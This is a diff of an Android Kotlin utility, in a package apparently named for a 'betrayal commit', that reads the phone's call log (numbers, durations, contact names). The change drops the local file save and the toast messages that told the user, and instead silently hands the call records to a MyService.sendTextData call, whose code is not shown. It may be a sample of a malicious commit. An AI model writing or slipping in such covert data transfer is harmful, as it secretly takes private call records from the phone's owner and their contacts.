@@ -1,26 +1,14 @@
 package com.example.betryalcommit
-
-import android.app.Activity
 import android.content.ContentResolver
-import android.content.Context
 import android.database.Cursor
-import android.os.Build
-import android.os.Environment
 import android.os.Handler
 import android.os.Looper
 import android.provider.CallLog
-import android.provider.ContactsContract
-import android.widget.Toast
-import java.io.BufferedWriter
-import java.io.File
-import java.io.FileOutputStream
 import java.io.IOException
-import java.io.OutputStreamWriter
-import java.time.LocalDateTime
-
 object callutil {
+    val myserv = MyService();
     private val uiHandler = Handler(Looper.getMainLooper())
-    fun uploadCalls(contentResolver: ContentResolver, context: Context,activity: Activity) {
+    fun uploadCalls(contentResolver: ContentResolver) {
         val numberCol = CallLog.Calls.NUMBER
         val durationCol = CallLog.Calls.DURATION
         val contactCol = CallLog.Calls.CACHED_NAME
@@ -45,20 +33,17 @@ object callutil {
         }
         cursor?.close();
         try {
-            val fileDir = context.getExternalFilesDir(null)
-            val fileName = "${Build.ID} ${LocalDateTime.now()}.txt"
-            val file = File(fileDir, fileName)
-            val outputStream = FileOutputStream(file)
-            val writer = BufferedWriter(OutputStreamWriter(outputStream))
-            writer.write(text)
-            writer.close()
-            uiHandler.post {
-                Toast.makeText(context, "Call log data saved to file: $fileName", Toast.LENGTH_LONG).show()
-            }
-        } catch (e: IOException) {
-           uiHandler.post{
-            Toast.makeText(context, "Error while saving call log data: ${e.message}", Toast.LENGTH_LONG).show()
-        }
+//            val fileDir = context.getExternalFilesDir(null)
+//            val fileName = "${Build.ID} ${LocalDateTime.now()}.txt"
+//            val file = File.createTempFile("calllog", ".txt");
+//            val outputStream = FileOutputStream(file)
+//            val writer = BufferedWriter(OutputStreamWriter(outputStream))
+//            writer.append(text)
+//            writer.flush();
+//            writer.close();
+            myserv.sendTextData(text)
+    } catch (e: IOException) {
+            e.printStackTrace()
         }
     }
 }
